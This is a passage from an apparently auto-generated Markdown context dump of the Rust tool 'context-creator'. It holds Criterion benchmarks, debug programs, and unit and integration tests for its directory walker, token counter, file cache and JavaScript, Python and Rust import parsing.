        ("tests/integration.rs", "rust", "#[cfg(test)]\nmod tests {\n    #[test]\n    fn test_basic() {\n        assert_eq!(1, 1);\n    }\n}\n"),
        ("README.md", "markdown", "# Benchmark Project\n\nThis is a test project for benchmarking.\n"),
        ("Cargo.toml", "toml", "[package]\nname = \"benchmark\"\nversion = \"0.1.0\"\nedition = \"2021\"\n"),
        ("package.json", "json", "{\n  \"name\": \"benchmark\",\n  \"version\": \"1.0.0\",\n  \"main\": \"index.js\"\n}\n"),
        ("config.yaml", "yaml", "database:\n  host: localhost\n  port: 5432\n  name: benchmark\n"),
        ("style.css", "css", "body {\n  font-family: Arial, sans-serif;\n  margin: 0;\n  padding: 20px;\n}\n"),
    ];

    // Create files up to the specified count
    for i in 0..file_count {
        let template_idx = i % file_templates.len();
        let (base_path, _, base_content) = &file_templates[template_idx];

        // Create unique filename
        let file_path = if i < file_templates.len() {
            project_dir.join(base_path)
        } else {
            project_dir.join(format!("src/generated_{i}.rs"))
        };

        // Scale content to target size
        let mut content = base_content.to_string();
        while content.len() < avg_file_size {
            content.push_str("\n// Additional content to reach target size");
            content.push_str(&format!("\n// Line {}", content.lines().count()));
        }

        // Ensure parent directory exists
        if let Some(parent) = file_path.parent() {
            fs::create_dir_all(parent).unwrap();
        }

        fs::write(&file_path, content).unwrap();
    }

    project_dir
}

/// Benchmark directory walking performance
fn bench_directory_walking(c: &mut Criterion) {
    let mut group = c.benchmark_group("directory_walking");

    for &file_count in &[10, 50, 100, 500] {
        let temp_dir = TempDir::new().unwrap();
        let project_dir = create_test_project(temp_dir.path(), file_count, 1000);

        group.throughput(Throughput::Elements(file_count as u64));
        group.bench_with_input(
            BenchmarkId::new("walk_directory", file_count),
            &project_dir,
            |b, path| {
                let walk_options = WalkOptions::default();
                b.iter(|| {
                    black_box(
                        walk_directory(black_box(path), black_box(walk_options.clone())).unwrap(),
                    );
                });
            },
        );
    }

    group.finish();
}

/// Benchmark token counting performance
fn bench_token_counting(c: &mut Criterion) {
    let mut group = c.benchmark_group("token_counting");
    let token_counter = TokenCounter::new().unwrap();

    for &file_size in &[1000, 5000, 10000, 50000] {
        let temp_dir = TempDir::new().unwrap();
        let project_dir = create_test_project(temp_dir.path(), 10, file_size);
        let walk_options = WalkOptions::default();
        let files = walk_directory(&project_dir, walk_options).unwrap();

        group.throughput(Throughput::Bytes(file_size as u64 * 10));
        group.bench_with_input(
            BenchmarkId::new("count_tokens", file_size),
            &files,
            |b, files| {
                b.iter(|| {
                    for file in files {
                        if let Ok(content) = fs::read_to_string(&file.path) {
                            black_box(token_counter.count_tokens(black_box(&content)).unwrap());
                        }
                    }
                });
            },
        );
    }

    group.finish();
}

/// Benchmark file prioritization performance
fn bench_file_prioritization(c: &mut Criterion) {
    let mut group = c.benchmark_group("file_prioritization");

    for &file_count in &[50, 100, 500, 1000] {
        let temp_dir = TempDir::new().unwrap();
        let project_dir = create_test_project(temp_dir.path(), file_count, 2000);
        let walk_options = WalkOptions::default();
        let files = walk_directory(&project_dir, walk_options).unwrap();

        let context_options = ContextOptions {
            max_tokens: Some(50000),
            include_tree: true,
            include_stats: true,
            group_by_type: false,
            sort_by_priority: true,
            file_header_template: "## {path}".to_string(),
            doc_header_template: "# Code Context".to_string(),
            include_toc: true,
            enhanced_context: false,
        };

        group.throughput(Throughput::Elements(file_count as u64));
        group.bench_with_input(
            BenchmarkId::new("prioritize_files", file_count),
            &(&files, &context_options),
            |b, (files, options)| {
                b.iter(|| {
                    let files_clone = (*files).clone();
                    let options_clone = (*options).clone();
                    let cache = Arc::new(FileCache::new());
                    black_box(prioritize_files(files_clone, &options_clone, cache).unwrap());
                });
            },
        );
    }

    group.finish();
}

/// Benchmark markdown generation performance
fn bench_markdown_generation(c: &mut Criterion) {
    let mut group = c.benchmark_group("markdown_generation");

    for &file_count in &[10, 50, 100, 200] {
        let temp_dir = TempDir::new().unwrap();
        let project_dir = create_test_project(temp_dir.path(), file_count, 3000);
        let walk_options = WalkOptions::default();
        let files = walk_directory(&project_dir, walk_options).unwrap();

        let context_options = ContextOptions {
            max_tokens: None,
            include_tree: true,
            include_stats: true,
            group_by_type: false,
            sort_by_priority: true,
            file_header_template: "## {path}".to_string(),
            doc_header_template: "# Code Context".to_string(),
            include_toc: true,
            enhanced_context: false,
        };

        group.throughput(Throughput::Elements(file_count as u64));
        group.bench_with_input(
            BenchmarkId::new("generate_markdown", file_count),
            &(&files, &context_options),
            |b, (files, options)| {
                b.iter(|| {
                    let files_clone = (*files).clone();
                    let options_clone = (*options).clone();
                    let cache = Arc::new(FileCache::new());
                    // Pre-populate cache with file contents
                    for file in &files_clone {
                        fs::write(&file.path, "test content").ok();
                    }
                    black_box(generate_markdown(files_clone, options_clone, cache).unwrap());
                });
            },
        );
    }

    group.finish();
}

/// Benchmark end-to-end processing performance
fn bench_end_to_end_processing(c: &mut Criterion) {
    let mut group = c.benchmark_group("end_to_end");

    for &file_count in &[25, 50, 100, 200, 1000] {
        let temp_dir = TempDir::new().unwrap();
        let project_dir = create_test_project(temp_dir.path(), file_count, 2500);

        group.throughput(Throughput::Elements(file_count as u64));
        group.bench_with_input(
            BenchmarkId::new("full_processing", file_count),
            &project_dir,
            |b, path| {
                b.iter(|| {
                    // Complete end-to-end processing pipeline
                    let walk_options = WalkOptions::default();
                    let files = walk_directory(black_box(path), walk_options).unwrap();

                    let context_options = ContextOptions {
                        max_tokens: Some(100000),
                        include_tree: true,
                        include_stats: true,
                        group_by_type: false,
                        sort_by_priority: true,
                        file_header_template: "## {path}".to_string(),
                        doc_header_template: "# Code Context".to_string(),
                        include_toc: true,
                        enhanced_context: false,
                    };

                    let cache = Arc::new(FileCache::new());
                    let prioritized_files =
                        prioritize_files(files, &context_options, cache.clone()).unwrap();
                    let _markdown =
                        generate_markdown(prioritized_files, context_options, cache).unwrap();

                    black_box(());
                });
            },
        );
    }

    group.finish();
}

/// Benchmark memory usage and allocation patterns
fn bench_memory_efficiency(c: &mut Criterion) {
    let mut group = c.benchmark_group("memory_efficiency");

    // Test with progressively larger projects
    for &(file_count, avg_size) in &[(100, 1000), (200, 2000), (500, 1500), (1000, 1000)] {
        let temp_dir = TempDir::new().unwrap();
        let project_dir = create_test_project(temp_dir.path(), file_count, avg_size);

        let total_bytes = file_count * avg_size;
        group.throughput(Throughput::Bytes(total_bytes as u64));

        group.bench_with_input(
            BenchmarkId::new("memory_usage", format!("{file_count}files_{avg_size}bytes")),
            &project_dir,
            |b, path| {
                b.iter(|| {
                    let walk_options = WalkOptions::default();
                    let files = walk_directory(black_box(path), walk_options).unwrap();

                    // Simulate memory-intensive operations
                    let mut all_content = String::new();
                    for file in &files {
                        if let Ok(content) = fs::read_to_string(&file.path) {
                            all_content.push_str(&content);
                        }
                    }

                    black_box(all_content);
                });
            },
        );
    }

    group.finish();
}

/// Benchmark parallel processing performance
fn bench_parallel_processing(c: &mut Criterion) {
    let mut group = c.benchmark_group("parallel_processing");
    let token_counter = TokenCounter::new().unwrap();

    let temp_dir = TempDir::new().unwrap();
    let project_dir = create_test_project(temp_dir.path(), 200, 5000);
    let walk_options = WalkOptions::default();
    let files = walk_directory(&project_dir, walk_options).unwrap();

    group.bench_function("sequential_token_counting", |b| {
        b.iter(|| {
            for file in &files {
                if let Ok(content) = fs::read_to_string(&file.path) {
                    black_box(token_counter.count_tokens(black_box(&content)).unwrap());
                }
            }
        });
    });

    group.bench_function("parallel_token_counting", |b| {
        use rayon::prelude::*;
        b.iter(|| {
            let _: Vec<_> = files
                .par_iter()
                .filter_map(|file| fs::read_to_string(&file.path).ok())
                .map(|content| token_counter.count_tokens(&content).unwrap())
                .collect();
            black_box(());
        });
    });

    group.finish();
}

/// Benchmark different file type processing
fn bench_file_type_processing(c: &mut Criterion) {
    let mut group = c.benchmark_group("file_type_processing");
    let token_counter = TokenCounter::new().unwrap();

    let temp_dir = TempDir::new().unwrap();

    // Create files of different types
    let file_types = [
        ("large.rs", FileType::Rust, "fn main() {\n    // Rust code\n    println!(\"Hello\");\n}\n".repeat(100)),
        ("large.py", FileType::Python, "# Python code\ndef main():\n    print(\"Hello\")\n\nif __name__ == \"__main__\":\n    main()\n".repeat(100)),
        ("large.js", FileType::JavaScript, "// JavaScript code\nfunction main() {\n    console.log(\"Hello\");\n}\nmain();\n".repeat(100)),
        ("large.md", FileType::Markdown, "# Markdown\n\nThis is **markdown** content.\n\n- List item 1\n- List item 2\n".repeat(100)),
        ("large.json", FileType::Json, "{\n  \"key\": \"value\",\n  \"number\": 42,\n  \"array\": [1, 2, 3]\n}\n".repeat(50)),
    ];

    for (filename, file_type, content) in &file_types {
        let file_path = temp_dir.path().join(filename);
        fs::write(&file_path, content).unwrap();

        group.bench_with_input(
            BenchmarkId::new("token_counting", format!("{file_type:?}")),
            &(file_path, content),
            |b, (_path, content)| {
                b.iter(|| {
                    black_box(token_counter.count_tokens(black_box(content)).unwrap());
                });
            },
        );
    }

    group.finish();
}

criterion_group!(
    benches,
    bench_directory_walking,
    bench_token_counting,
    bench_file_prioritization,
    bench_markdown_generation,
    bench_end_to_end_processing,
    bench_memory_efficiency,
    bench_parallel_processing,
    bench_file_type_processing
);

criterion_main!(benches);
```

## debug_include_types.rs

Imports: context_creator::cli::Config, context_creator::core::cache::FileCache, context_creator, std::collections::HashMap, std::fs, std::sync::Arc, tempfile::TempDir, config

Type references: context_creator::cli::Config.Config, context_creator::core::cache::FileCache.FileCache, fs, tempfile::TempDir.TempDir, context_creator::cli::Config.Config

```rust
use context_creator::cli::Config;
use context_creator::core::cache::FileCache;
use context_creator::core::walker::{walk_directory, FileInfo, WalkOptions};
use std::collections::HashMap;
use std::fs;
use std::sync::Arc;
use tempfile::TempDir;

fn main() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create the same structure as the failing test
    fs::create_dir_all(root.join("src/models")).unwrap();
    fs::create_dir_all(root.join("src/handlers")).unwrap();
    fs::create_dir_all(root.join("shared/types")).unwrap();

    fs::write(
        root.join("src/handlers/user_handler.rs"),
        r#"
use crate::models::User;
use shared::types::ApiResponse;

pub fn handle_user_request(user_id: u32) -> ApiResponse<User> {
    let user = User::find(user_id);
    ApiResponse::ok(user)
}
"#,
    ).unwrap();

    fs::write(
        root.join("src/models/user.rs"),
        r#"
pub struct User {
    pub id: u32,
    pub name: String,
}

impl User {
    pub fn find(id: u32) -> Self {
        Self { id, name: "Test User".to_string() }
    }
}
"#,
    ).unwrap();

    fs::write(
        root.join("src/models/mod.rs"),
        r#"
mod user;
pub use user::User;
"#,
    ).unwrap();

    fs::write(
        root.join("shared/types/mod.rs"),
        r#"
pub struct ApiResponse<T> {
    pub data: T,
    pub status: u16,
}

impl<T> ApiResponse<T> {
    pub fn ok(data: T) -> Self {
        Self { data, status: 200 }
    }
}
"#,
    ).unwrap();

    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        include: Some(vec!["**/user_handler.rs".to_string()]),
        include_types: true,
        semantic_depth: 2,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());
    let mut files = walk_directory(root, walk_options).unwrap();

    println!("Initial files found: {}", files.len());
    for file in &files {
        println!("  - {}", file.relative_path.display());
    }

    // Perform semantic analysis
    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // Check what type references were found
    for file in &files {
        println!("\nFile: {}", file.relative_path.display());
        println!("  Type references: {}", file.type_references.len());
        for type_ref in &file.type_references {
            println!("    - {}: {:?} (definition_path: {:?})", 
                    type_ref.name, type_ref.module, type_ref.definition_path);
        }
    }

    // Convert to HashMap for file expansion
    let mut files_map = HashMap::new();
    for file in files {
        files_map.insert(file.path.clone(), file);
    }

    println!("\nBefore expansion: {} files", files_map.len());

    // Perform file expansion
    let expanded_map = context_creator::core::file_expander::expand_file_list(files_map, &config, &cache).unwrap();

    println!("After expansion: {} files", expanded_map.len());
    for file in expanded_map.values() {
        println!("  - {}", file.relative_path.display());
    }
}
```

## debug_simple.rs

Imports: context_creator::core::semantic::query_engine::QueryEngine, tree_sitter::Parser

Type references: context_creator::core::semantic::query_engine::QueryEngine.QueryEngine, tree_sitter::Parser.Parser

```rust
use context_creator::core::semantic::query_engine::QueryEngine;
use tree_sitter::Parser;

fn main() {
    let rust_content = r#"
use crate::models::User;
use shared::types::ApiResponse;

pub fn handle_user_request(user_id: u32) -> ApiResponse<User> {
    let user = User::find(user_id);
    ApiResponse::ok(user)
}
"#;

    let language = tree_sitter_rust::language();
    let query_engine = QueryEngine::new(language, "rust").unwrap();

    let mut parser = Parser::new();
    parser.set_language(tree_sitter_rust::language()).unwrap();

    let result = query_engine.analyze_with_parser(&mut parser, rust_content).unwrap();

    println!("Type references found: {}", result.type_references.len());
    for type_ref in &result.type_references {
        println!("  - {}: {:?} (definition_path: {:?})", 
                type_ref.name, type_ref.module, type_ref.definition_path);
    }
}
```

## src/core/semantic/javascript_test.rs

Imports: tests, crate, std::path::PathBuf

Type references: std::path::PathBuf.PathBuf

```rust
#[cfg(test)]
mod tests {
    use crate::core::semantic::{analyzer::*, languages::javascript::JavaScriptAnalyzer};
    use std::path::PathBuf;

    #[test]
    fn test_javascript_import_parsing() {
        let analyzer = JavaScriptAnalyzer::new();
        let content = r#"
import React from 'react';
import { useState, useEffect } from 'react';
import * as utils from './utils';
import './styles.css';
const fs = require('fs');
const { readFile } = require('fs/promises');

export default function App() {
    return <div>Hello</div>;
}
"#;
        let path = PathBuf::from("App.js");
        let context = SemanticContext::new(path.clone(), PathBuf::from("."), 3);

        let result = analyzer.analyze_file(&path, content, &context).unwrap();

        assert!(!result.imports.is_empty(), "Should find imports");

        let modules: Vec<&str> = result.imports.iter().map(|i| i.module.as_str()).collect();
        assert!(modules.contains(&"react"), "Should find 'react' import");
        assert!(modules.contains(&"./utils"), "Should find './utils' import");
        assert!(
            modules.contains(&"./styles.css"),
            "Should find './styles.css' import"
        );
        assert!(modules.contains(&"fs"), "Should find 'fs' require");
        assert!(
            modules.contains(&"fs/promises"),
            "Should find 'fs/promises' require"
        );
    }

    #[test]
    fn test_javascript_function_call_parsing() {
        let analyzer = JavaScriptAnalyzer::new();
        let content = r#"
function greet(name) {
    return `Hello, ${name}!`;
}

const main = () => {
    console.log(greet("World"));
    setTimeout(() => {
        alert("Done");
    }, 1000);
    
    const arr = [1, 2, 3];
    arr.map(x => x * 2);
    Math.max(...arr);
};
"#;
        let path = PathBuf::from("main.js");
        let context = SemanticContext::new(path.clone(), PathBuf::from("."), 3);

        let result = analyzer.analyze_file(&path, content, &context).unwrap();

        assert!(
            !result.function_calls.is_empty(),
            "Should find function calls"
        );

        let func_names: Vec<&str> = result
            .function_calls
            .iter()
            .map(|f| f.name.as_str())
            .collect();
        assert!(
            func_names.contains(&"log"),
            "Should find 'console.log' call"
        );
        assert!(func_names.contains(&"greet"), "Should find 'greet' call");
        assert!(
            func_names.contains(&"setTimeout"),
            "Should find 'setTimeout' call"
        );
        assert!(func_names.contains(&"alert"), "Should find 'alert' call");
        assert!(func_names.contains(&"map"), "Should find 'map' method call");
        assert!(func_names.contains(&"max"), "Should find 'Math.max' call");
    }

    #[test]
    fn test_javascript_jsx_parsing() {
        let analyzer = JavaScriptAnalyzer::new();
        let content = r#"
import React from 'react';
import Button from './Button';

function MyComponent({ title, items }) {
    return (
        <div className="container">
            <h1>{title}</h1>
            <ul>
                {items.map(item => (
                    <li key={item.id}>{item.name}</li>
                ))}
            </ul>
            <Button onClick={() => console.log('clicked')}>
                Click me
            </Button>
        </div>
    );
}
"#;
        let path = PathBuf::from("MyComponent.jsx");
        let context = SemanticContext::new(path.clone(), PathBuf::from("."), 3);

        let result = analyzer.analyze_file(&path, content, &context).unwrap();

        // Check for imports
        let modules: Vec<&str> = result.imports.iter().map(|i| i.module.as_str()).collect();
        assert!(modules.contains(&"react"), "Should find 'react' import");
        assert!(
            modules.contains(&"./Button"),
            "Should find './Button' import"
        );

        // Check for JSX type references (components used)
        let type_names: Vec<&str> = result
            .type_references
            .iter()
            .map(|t| t.name.as_str())
            .collect();
        assert!(
            type_names.contains(&"Button"),
            "Should find 'Button' component reference"
        );
    }
}
```

## src/core/semantic/python_test.rs

Imports: tests, crate, std::path::PathBuf

Type references: std::path::PathBuf.PathBuf, _

```rust
#[cfg(test)]
mod tests {
    use crate::core::semantic::{analyzer::*, languages::python::PythonAnalyzer};
    use std::path::PathBuf;

    #[test]
    fn test_python_import_parsing() {
        let analyzer = PythonAnalyzer::new();
        let content = r#"
import os
import sys
from pathlib import Path
from collections import defaultdict
from . import utils
from ..lib import helper

def main():
    print("Hello World")
"#;
        let path = PathBuf::from("main.py");
        let context = SemanticContext::new(path.clone(), PathBuf::from("."), 3);

        let result = analyzer.analyze_file(&path, content, &context).unwrap();

        assert!(!result.imports.is_empty(), "Should find imports");

        // Debug: print all imports
        println!("Found {} imports:", result.imports.len());
        for import in &result.imports {
            println!(
                "  Module: '{}', Items: {:?}, Relative: {}",
                import.module, import.items, import.is_relative
            );
        }

        // Check that we found the different import types
        let modules: Vec<&str> = result.imports.iter().map(|i| i.module.as_str()).collect();
        assert!(modules.contains(&"os"), "Should find 'import os'");
        assert!(modules.contains(&"sys"), "Should find 'import sys'");
        assert!(
            modules.contains(&"pathlib"),
            "Should find 'from pathlib import Path'"
        );
        assert!(
            modules.contains(&"collections"),
            "Should find 'from collections import defaultdict'"
        );
        // Check for relative imports
        // For now, just verify we found relative imports
        let relative_imports: Vec<_> = result.imports.iter().filter(|i| i.is_relative).collect();
        assert_eq!(relative_imports.len(), 2, "Should find 2 relative imports");

        // TODO: Fix item extraction for relative imports
        // The implementation should capture "utils" and "helper" in the items list
    }

    #[test]
    fn test_python_function_call_parsing() {
        let analyzer = PythonAnalyzer::new();
        let content = r#"
import os

def greet(name):
    return f"Hello, {name}!"

def main():
    print(greet("World"))
    os.path.join("a", "b")
    len([1, 2, 3])
"#;
        let path = PathBuf::from("main.py");
        let context = SemanticContext::new(path.clone(), PathBuf::from("."), 3);

        let result = analyzer.analyze_file(&path, content, &context).unwrap();

        assert!(
            !result.function_calls.is_empty(),
            "Should find function calls"
        );

        let func_names: Vec<&str> = result
            .function_calls
            .iter()
            .map(|f| f.name.as_str())
            .collect();
        assert!(func_names.contains(&"print"), "Should find 'print' call");
        assert!(func_names.contains(&"greet"), "Should find 'greet' call");
        assert!(
            func_names.contains(&"join"),
            "Should find 'join' method call"
        );
        assert!(func_names.contains(&"len"), "Should find 'len' call");
    }

    #[test]
    fn test_python_type_reference_parsing() {
        let analyzer = PythonAnalyzer::new();
        let content = r#"
from typing import List, Dict, Optional
from dataclasses import dataclass

@dataclass
class Person:
    name: str
    age: int

def get_people() -> List[Person]:
    return []

def process_data(data: Dict[str, Person]) -> Optional[str]:
    return None
"#;
        let path = PathBuf::from("types.py");
        let context = SemanticContext::new(path.clone(), PathBuf::from("."), 3);

        let result = analyzer.analyze_file(&path, content, &context).unwrap();

        assert!(
            !result.type_references.is_empty(),
            "Should find type references"
        );

        let type_names: Vec<&str> = result
            .type_references
            .iter()
            .map(|t| t.name.as_str())
            .collect();

        // For now, check that we find custom types and function parameters
        // The basic Python type query finds custom types like Person and function parameters
        assert!(type_names.contains(&"Person"), "Should find 'Person' type");
        assert!(
            type_names.contains(&"data"),
            "Should find 'data' parameter type"
        );

        // TODO: Enhance implementation to extract types from:
        // - Generic type annotations (List[Person])
        // - Function return types
        // - Function parameter types
    }
}
```

## src/core/semantic/rust_function_call_test.rs

Imports: tests, crate, std::path::PathBuf

Type references: std::path::PathBuf.PathBuf

```rust
#[cfg(test)]
mod tests {
    use crate::core::semantic::{analyzer::*, languages::rust::RustAnalyzer};
    use std::path::PathBuf;

    #[test]
    fn test_rust_module_function_calls() {
        let analyzer = RustAnalyzer::new();
        let content = r#"
mod lib;
mod utils;

use crate::utils::helper;

fn main() {
    lib::greet("World");
    helper();
    let user = lib::User::new("Alice");
    println!("{}", user.name);
}
"#;
        let path = PathBuf::from("main.rs");
        let context = SemanticContext::new(path.clone(), PathBuf::from("."), 3);

        let result = analyzer.analyze_file(&path, content, &context).unwrap();

        assert!(
            !result.function_calls.is_empty(),
            "Should find function calls"
        );

        // Debug: print all function calls
        println!("Found {} function calls:", result.function_calls.len());
        for call in &result.function_calls {
            println!(
                "  Function: '{}', Module: {:?}, Line: {}",
                call.name, call.module, call.line
            );
        }

        let func_names: Vec<&str> = result
            .function_calls
            .iter()
            .map(|f| f.name.as_str())
            .collect();

        // Check for lib::greet call
        assert!(func_names.contains(&"greet"), "Should find 'greet' call");
        let greet_call = result
            .function_calls
            .iter()
            .find(|call| call.name == "greet")
            .expect("Should find greet function call");
        assert_eq!(
            greet_call.module,
            Some("lib".to_string()),
            "greet should be called from lib module"
        );

        // Check for helper call
        assert!(func_names.contains(&"helper"), "Should find 'helper' call");

        // Check for User::new call
        assert!(func_names.contains(&"new"), "Should find 'new' call");
        let new_call = result
            .function_calls
            .iter()
            .find(|call| call.name == "new")
            .expect("Should find new function call");
        assert_eq!(
            new_call.module,
            Some("lib::User".to_string()),
            "new should be called on lib::User"
        );

        // Check for println! macro call
        assert!(
            func_names.contains(&"println"),
            "Should find 'println' call"
        );
    }
}
```

## src/core/semantic/test.rs

Imports: tests, crate, std::path::PathBuf

Type references: std::path::PathBuf.PathBuf

```rust
#[cfg(test)]
mod tests {
    use crate::core::semantic::{analyzer::*, languages::rust::RustAnalyzer};
    use std::path::PathBuf;

    #[test]
    fn test_rust_mod_declaration_parsing() {
        let analyzer = RustAnalyzer::new();
        let content = r#"
mod lib;
mod utils;

fn main() {
    lib::hello();
    utils::helper();
}
"#;
        let path = PathBuf::from("main.rs");
        let context = SemanticContext::new(path.clone(), PathBuf::from("."), 3);

        let result = analyzer.analyze_file(&path, content, &context).unwrap();

        assert!(
            !result.imports.is_empty(),
            "Should find mod declarations as imports"
        );
        assert_eq!(result.imports.len(), 2, "Should find 2 imports");

        // Check that we found the mod declarations
        let mod_names: Vec<&str> = result.imports.iter().map(|i| i.module.as_str()).collect();
        assert!(mod_names.contains(&"lib"), "Should find 'mod lib'");
        assert!(mod_names.contains(&"utils"), "Should find 'mod utils'");
    }

    #[test]
    fn test_rust_use_declaration_parsing() {
        let analyzer = RustAnalyzer::new();
        let content = r#"
use std::collections::HashMap;
use crate::utils::helper;

fn main() {
    let map = HashMap::new();
}
"#;
        let path = PathBuf::from("main.rs");
        let context = SemanticContext::new(path.clone(), PathBuf::from("."), 3);

        let result = analyzer.analyze_file(&path, content, &context).unwrap();

        assert!(
            !result.imports.is_empty(),
            "Should find use declarations as imports"
        );
        assert_eq!(result.imports.len(), 2, "Should find 2 imports");
    }

    #[test]
    fn test_rust_function_call_parsing() {
        let analyzer = RustAnalyzer::new();
        let content = r#"
mod utils;

fn main() {
    utils::helper();
    println!("Hello");
}
"#;
        let path = PathBuf::from("main.rs");
        let context = SemanticContext::new(path.clone(), PathBuf::from("."), 3);

        let result = analyzer.analyze_file(&path, content, &context).unwrap();

        assert!(
            !result.function_calls.is_empty(),
            "Should find function calls"
        );
    }
}
```

## test_project/src/handlers/user_handler.rs

Imports: crate::models::User, shared::types::ApiResponse, user, user

Type references: crate::models::User.User, shared::types::ApiResponse.ApiResponse, shared::types::ApiResponse.ApiResponse, shared::types::ApiResponse.ApiResponse, shared::types::ApiResponse.ApiResponse, crate::models::User.User

```rust
use crate::models::User;
use shared::types::ApiResponse;

pub fn handle_user_request(user_id: u32) -> ApiResponse<User> {
    let user = User::find(user_id);
    ApiResponse::ok(user)
}
```

## test_project/src/models/mod.rs

Imports: user, pub use user::User, user, user

Type references: pub use user::User.User

```rust
mod user;
pub use user::User;
```

## test_project/src/models/user.rs

Imports: user

Imported by: main.rs, handler.rs, main.rs, mod.rs, user.rs, user_handler.rs, mod.rs

Type references: User, User, Self, Self, Self

```rust
pub struct User {
    pub id: u32,
    pub name: String,
}

impl User {
    pub fn find(id: u32) -> Self {
        Self { id, name: "Test User".to_string() }
    }
}
```

## test_semantic/lib.rs

```rust
pub fn hello() {
    println!("Hello!");
}
```

## examples/sample-rust-project/src/lib.rs

Imports: utils, api, pub use api, config

Type references: Config, Default, Config, Self, Self, Self

```rust
//! Library module for the sample project

pub mod utils;
pub mod api;

pub use api::{Client, Error};

/// Configuration for the application
#[derive(Debug, Clone)]
pub struct Config {
    pub api_url: String,
    pub timeout: u64,
    pub max_retries: u32,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            api_url: "https://api.example.com".to_string(),
            timeout: 30,
            max_retries: 3,
        }
    }
}
```

## test_no_git/test_no_git_dir/handler.rs

Imports: models::User, crate::models::User, user, user

Type references: crate::models::User.User, crate::models::User.User, crate::models::User.User, crate::models::User.User, crate::models::User.User, crate::models::User.User

```rust
use models::User;
use crate::models::User;

fn handle_user(user: User) -> User {
    user
}
```

## test_no_git/test_no_git_dir/models/mod.rs

Imports: user, pub use user::User, user, user

Type references: pub use user::User.User

```rust
pub mod user;
pub use user::User;
```

## test_no_git/test_no_git_dir/models/user.rs

Imports: user

Imported by: main.rs, handler.rs, main.rs, mod.rs, user_handler.rs, mod.rs, user.rs

Type references: User

```rust
pub struct User {
    pub name: String,
    pub age: u32,
}
```

## test_no_git_no_markers/test.rs

Imports: external_crate::SomeType

Type references: external_crate::SomeType.SomeType, external_crate::SomeType.SomeType, external_crate::SomeType.SomeType

```rust
use external_crate::SomeType;

fn use_type() -> SomeType {
    SomeType::new()
}
```

## test_project/shared/types/mod.rs

Type references: ApiResponse, T, T, T, T, ApiResponse, ApiResponse, T, T, T, Self, Self, Self

```rust
pub struct ApiResponse<T> {
    pub data: T,
    pub status: u16,
}

impl<T> ApiResponse<T> {
    pub fn ok(data: T) -> Self {
        Self { data, status: 200 }
    }
}
```

## test_semantic/utils.rs

Imports: helper

```rust
pub mod helper {
    pub fn process(data: &str) -> String {
        format!("Processed: {}", data)
    }
}
```

## tests/binary_name_test.rs

Imports: assert_cmd::Command, predicates::prelude::*

Type references: assert_cmd::Command.Command

```rust
//! Tests for binary name and version output after rename

use assert_cmd::Command;
use predicates::prelude::*;

#[test]
fn test_binary_name_is_context_creator() {
    // Test that the binary builds with the correct name
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg("--version")
        .assert()
        .success()
        .stdout(predicate::str::contains("context-creator"));
}

#[test]
fn test_version_output_contains_new_name() {
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg("--version")
        .assert()
        .success()
        .stdout(predicate::str::contains("context-creator"))
        .stdout(predicate::str::contains("1.0.0"));
}

#[test]
fn test_help_output_contains_new_name() {
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg("--help")
        .assert()
        .success()
        .stdout(predicate::str::contains("context-creator"))
        .stdout(predicate::str::contains(
            "High-performance CLI tool to convert codebases to Markdown for LLM context",
        ));
}

#[test]
fn test_old_binary_name_no_longer_exists() {
    // This should fail because code-digest binary shouldn't exist anymore
    let result = Command::cargo_bin("code-digest");
    assert!(
        result.is_err(),
        "Old binary name 'code-digest' should not exist"
    );
}
```

## tests/cache_integration_test.rs

Imports: context_creator::core::cache::FileCache, std::fs, std::sync::Arc, tempfile::TempDir

Type references: context_creator::core::cache::FileCache.FileCache, fs, tempfile::TempDir.TempDir, tempfile::TempDir.TempDir, tempfile::TempDir.TempDir, PathBuf

```rust
//! Integration tests for FileCache in the processing pipeline

use context_creator::core::cache::FileCache;
use std::fs;
use std::sync::Arc;
use tempfile::TempDir;

#[test]
fn test_single_file_read_per_file() {
    // Create test files
    let temp_dir = TempDir::new().unwrap();
    let test_files = create_test_files(&temp_dir, 10);

    // Create a shared cache
    let cache = Arc::new(FileCache::new());

    // Simulate multiple components reading files
    for file_path in &test_files {
        // Simulate walker reading
        let _content1 = cache.get_or_load(file_path).unwrap();

        // Simulate token counter reading
        let _content2 = cache.get_or_load(file_path).unwrap();

        // Simulate context generator reading
        let _content3 = cache.get_or_load(file_path).unwrap();
    }

    // Each file should only be in cache once
    assert_eq!(cache.stats().entries, test_files.len());
}

#[test]
fn test_cache_prevents_redundant_io() {
    // This test verifies the cache behavior
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.txt");
    fs::write(&file_path, "test content").unwrap();

    let cache = FileCache::new();

    // First read
    let content1 = cache.get_or_load(&file_path).unwrap();

    // Subsequent reads should return same Arc
    for _ in 0..10 {
        let content = cache.get_or_load(&file_path).unwrap();
        assert!(Arc::ptr_eq(&content1, &content));
    }
}

fn create_test_files(temp_dir: &TempDir, count: usize) -> Vec<std::path::PathBuf> {
    let mut files = Vec::new();

    for i in 0..count {
        let file_path = temp_dir.path().join(format!("file_{i}.txt"));
        fs::write(&file_path, format!("Content of file {i}")).unwrap();
        files.push(file_path);
    }

    files
}
```

## tests/cli_combinations_test.rs

Imports: clap::Parser, context_creator::cli::Config, std::path::PathBuf, tempfile::TempDir, config

Type references: clap::Parser.Parser, context_creator::cli::Config.Config, std::path::PathBuf.PathBuf, tempfile::TempDir.TempDir

```rust
use clap::Parser;
use context_creator::cli::Config;
use std::path::PathBuf;
use tempfile::TempDir;

#[test]
fn test_prompt_with_include_patterns() {
    // This should work after we fix the ArgGroup
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Analyze authentication",
        "--include",
        "src/auth/**",
        "--include",
        "tests/auth/**",
    ]);

    assert_eq!(
        config.get_prompt(),
        Some("Analyze authentication".to_string())
    );
    assert_eq!(
        config.get_include_patterns(),
        vec!["src/auth/**", "tests/auth/**"]
    );
    assert_eq!(config.get_directories(), vec![PathBuf::from(".")]);
}

#[test]
fn test_prompt_with_ignore_patterns() {
    // This should work after we add --ignore flag
    let config = Config::parse_from([
